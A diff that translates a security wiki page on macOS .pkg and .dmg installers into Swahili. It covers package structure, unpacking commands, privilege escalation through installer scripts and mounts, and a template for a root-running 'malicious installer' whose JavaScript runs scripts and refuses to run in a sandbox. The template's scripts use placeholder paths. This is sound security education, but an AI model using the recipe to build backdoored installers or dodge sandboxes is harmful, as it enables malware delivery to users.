@@ -4,22 +4,21 @@
 
 ## Pkg Basic Information
 
-A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.
+Kifurushi cha **installer** cha macOS (pia kinachojulikana kama faili `.pkg`) ni muundo wa faili unaotumiwa na macOS ku **distribute software**. Faili hizi ni kama **sanduku linaloshikilia kila kitu ambacho kipande cha software** kinahitaji ili kufunga na kufanya kazi ipasavyo.
 
-The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.
+Faili la kifurushi lenyewe ni archive inayoshikilia **hifadhi ya faili na directories ambazo zitawekwa kwenye kompyuta ya lengo**. Inaweza pia kujumuisha **scripts** za kutekeleza kazi kabla na baada ya ufungaji, kama vile kuandaa faili za usanidi au kusafisha toleo za zamani za software.
 
 ### Hierarchy
 
 <figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>
 
-- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
-- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
-- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
-- **Payload (CPIO archive gzip compresses)**: Files to install in the `install-location` from PackageInfo
-- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.
+- **Distribution (xml)**: Marekebisho (kichwa, maandiko ya karibisho…) na ukaguzi wa script/ufungaji
+- **PackageInfo (xml)**: Taarifa, mahitaji ya ufungaji, eneo la ufungaji, njia za scripts za kutekeleza
+- **Bill of materials (bom)**: Orodha ya faili za kufunga, kuboresha au kuondoa pamoja na ruhusa za faili
+- **Payload (CPIO archive gzip compresses)**: Faili za kufunga katika `install-location` kutoka PackageInfo
+- **Scripts (CPIO archive gzip compressed)**: Scripts za kabla na baada ya ufungaji na rasilimali zaidi zilizotolewa kwenye directory ya muda kwa ajili ya utekelezaji.
 
 ### Decompress
-
 ```bash
 # Tool to directly get the files inside a package
 pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"
@@ -33,68 +32,64 @@ xar -xf "/path/to/package.pkg"
 cat Scripts | gzip -dc | cpio -i
 cpio -i < Scripts
 ```
+Ili kuona maudhui ya installer bila kuyakandamiza kwa mikono, unaweza pia kutumia zana ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
 
-In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
+## Taarifa za Msingi za DMG
 
-## DMG Basic Information
-
-DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.
+Faili za DMG, au Picha za Disk za Apple, ni muundo wa faili unaotumiwa na macOS ya Apple kwa picha za diski. Faili ya DMG kimsingi ni **picha ya diski inayoweza kuunganishwa** (ina mfumo wake wa faili) ambayo ina data ya block mbichi ambayo mara nyingi imepandishwa na wakati mwingine imefungwa. Unapofungua faili ya DMG, macOS **inaunganisha kama vile ilikuwa diski halisi**, ikikuruhusu kufikia maudhui yake.
 
 > [!CAUTION]
-> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
+> Kumbuka kwamba **`.dmg`** installers zinasaidia **format nyingi sana** kwamba katika siku za nyuma baadhi yao zikiwa na udhaifu zilikuwa zikitumiwa kupata **utendaji wa msimbo wa kernel**.
 
-### Hierarchy
+### Hifadhi
 
 <figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>
 
-The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:
+Hifadhi ya faili ya DMG inaweza kuwa tofauti kulingana na maudhui. Hata hivyo, kwa DMGs za programu, kawaida inafuata muundo huu:
 
-- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
-  - Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
-  - Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.
+- Kiwango cha Juu: Hii ni mzizi wa picha ya diski. Mara nyingi ina programu na labda kiungo kwa folda ya Maombi.
+- Programu (.app): Hii ni programu halisi. Katika macOS, programu kawaida ni kifurushi kinachojumuisha faili na folda nyingi zinazounda programu hiyo.
+- Kiungo cha Maombi: Hii ni njia fupi kwa folda ya Maombi katika macOS. Kusudi la hii ni kukurahisishia kufunga programu. Unaweza kuvuta faili ya .app kwenye njia fupi hii ili kufunga programu.
 
-## Privesc via pkg abuse
+## Privesc kupitia matumizi ya pkg
 
-### Execution from public directories
+### Utekelezaji kutoka kwa saraka za umma
 
-If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:
+Ikiwa skripti ya kabla au baada ya ufungaji inatekelezwa kutoka **`/var/tmp/Installerutil`**, na mshambuliaji anaweza kudhibiti skripti hiyo ili apandishe mamlaka kila wakati inatekelezwa. Au mfano mwingine wa kufanana:
 
 <figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>
 
 ### AuthorizationExecuteWithPrivileges
 
-This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
-
+Hii ni [kazi ya umma](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo waunganishaji na wasasishaji wengi wataita ili **kutekeleza kitu kama root**. Kazi hii inakubali **njia** ya **faili** ya **kutekeleza** kama parameter, hata hivyo, ikiwa mshambuliaji anaweza **kubadilisha** faili hii, ataweza **kutumia** utekelezaji wake na root ili **kupandisha mamlaka**.
 ```bash
 # Breakpoint in the function to check wich file is loaded
 (lldb) b AuthorizationExecuteWithPrivileges
 # You could also check FS events to find this missconfig
 ```
+Kwa maelezo zaidi angalia hii hotuba: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
 
-For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
+### Utekelezaji kwa kupandisha
 
-### Execution by mounting
+Ikiwa mfunguo unandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` bila wamiliki ili uweze **kubadilisha faili yoyote wakati wa ufungaji** ili kutumia mchakato wa ufungaji.
 
-If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.
+Mfano wa hili ni **CVE-2021-26089** ambayo ilifanikiwa **kufuta script ya kawaida** ili kupata utekelezaji kama root. Kwa maelezo zaidi angalia hotuba: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
 
-An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
+## pkg kama malware
 
-## pkg as malware
+### Payload Tupu
 
-### Empty Payload
+Inawezekana tu kuzalisha faili **`.pkg`** yenye **pre and post-install scripts** bila payload halisi isipokuwa malware ndani ya scripts.
 
-It's possible to just generate a **`.pkg`** file with **pre and post-install scripts** without any real payload apart from the malware inside the scripts.
+### JS katika distribution xml
 
-### JS in Distribution xml
-
-It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:
+Inawezekana kuongeza **`<script>`** tags katika faili **distribution xml** ya kifurushi na hiyo code itatekelezwa na inaweza **kutekeleza amri** kwa kutumia **`system.run`**:
 
 <figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>
 
-### Backdoored Installer
+### Mfunguo wa Nyuma
 
-Malicious installer using a script and JS code inside dist.xml
-
+Mfunguo mbaya ukitumia script na JS code ndani ya dist.xml
 ```bash
 # Package structure
 mkdir -p pkgroot/root/Applications/MyApp
@@ -117,50 +112,49 @@ pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.maliciou
 cat > ./dist.xml <<EOF
 <?xml version="1.0" encoding="utf-8"?>
 <installer-gui-script minSpecVersion="1">
-    <title>Malicious Installer</title>
-    <options customize="allow" require-scripts="false"/>
-    <script>
-        <![CDATA[
-        function installationCheck() {
-            if (system.isSandboxed()) {
-                my.result.title = "Cannot install in a sandbox.";
-                my.result.message = "Please run this installer outside of a sandbox.";
-                return false;
-            }
-            return true;
-        }
-        function volumeCheck() {
-            return true;
-        }
-        function preflight() {
-            system.run("/path/to/preinstall");
-        }
-        function postflight() {
-            system.run("/path/to/postinstall");
-        }
-        ]]>
-    </script>
-    <choices-outline>
-        <line choice="default">
-            <line choice="myapp"/>
-        </line>
-    </choices-outline>
-    <choice id="myapp" title="MyApp">
-        <pkg-ref id="com.malicious.myapp"/>
-    </choice>
-    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
+<title>Malicious Installer</title>
+<options customize="allow" require-scripts="false"/>
+<script>
+<![CDATA[
+function installationCheck() {
+if (system.isSandboxed()) {
+my.result.title = "Cannot install in a sandbox.";
+my.result.message = "Please run this installer outside of a sandbox.";
+return false;
+}
+return true;
+}
+function volumeCheck() {
+return true;
+}
+function preflight() {
+system.run("/path/to/preinstall");
+}
+function postflight() {
+system.run("/path/to/postinstall");
+}
+]]>
+</script>
+<choices-outline>
+<line choice="default">
+<line choice="myapp"/>
+</line>
+</choices-outline>
+<choice id="myapp" title="MyApp">
+<pkg-ref id="com.malicious.myapp"/>
+</choice>
+<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
 </installer-gui-script>
 EOF
 
 # Buil final
 productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
 ```
+## Marejeo
 
-## References
-
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
-- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
+- [**DEF CON 27 - Kufungua Pkgs Kuangalia Ndani ya Macos Installer Packages na Mapungufu ya Usalama ya Kawaida**](https://www.youtube.com/watch?v=iASSG0_zobQ)
+- [**OBTS v4.0: "Ulimwengu wa Kijani wa macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
+- [**DEF CON 27 - Kufungua Pkgs Kuangalia Ndani ya MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
 - [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
 
 {{#include ../../../banners/hacktricks-training.md}}
